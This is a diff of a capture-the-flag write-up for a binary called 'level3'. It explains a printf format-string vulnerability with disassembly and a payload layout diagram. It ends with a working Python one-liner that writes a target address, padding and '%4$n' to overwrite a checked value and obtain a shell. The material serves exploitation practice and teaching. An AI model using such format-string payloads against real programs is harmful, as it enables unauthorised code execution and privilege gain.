@@ -1,8 +1,35 @@
-# We notify that inside the binary, the input from user is directly printed to terminal via "printf" without formatter and then an arbitrary memory (TODO) address is compared
-# to branch on critical section
-# We craft our exploit with the formatter "%n" that lets "printf" function write the number of characters already written so far.
-# At the time of call to "printf", the beginning of user input will be on the fourth argument on the stack so we use "$" formatter to let the "%n" access it directly
-# Then we settle the size of our payload to the value of the arbitrary compared value.
+## Analysis
+
+The program calls fgets(), which is a secured function against buffer overflow. Then it prints the buffer.
+An impossible check is realized, if it return true, a meaningless string is printed and a shell launched via system call.
+
+`0x080484da <+54>:    mov    0x804988c,%eax`
+`0x080484df <+59>:    cmp    $0x40,%eax`
+
+Otherwise the function return 0.
+
+## Exploit
+
+Format string : the printf is called directly with the user-provided input so we can use the %n formatter to write into an address an arbitrary value.
+
+`0x080484d5 <+49>:    call   0x8048390 <printf@plt>`
+
+## Crafting
+
+0		   4			  64		66	     68
+[TARGET_MEMORY_ADDR][RANDOM_PADDING_STRING][$_FORMATTER][%N_FORMATTER]
+	^					^		^
+	| 3.write(len(0 - 64))			|    1.read     |		   2.fetch
+	|					----------------------- printf() ------------ stack[3] (TARGET_MEMORY_ADDR)
+	|							         |
+	------------------------------------------------------------------
+
+We provide the %n formatter to printf(). This one let us write into the following argument the number of characters written before meeting it.
+We use the $x formatter to access the 4th argument on the stack, which is the beginning of our buffer.
+Our buffer head is the memory addres check by the critical cmp instruction.
+We pad our buffer we enough noise to match the other operand of value of cmp instruction.
+						
+## Shooting
 
 python -c 'print "\x8c\x98\x04\x08" + "A" * 60 + "%4$n"' > /tmp/payload_level3
 cat /tmp/payload_level3 - | ./level3 
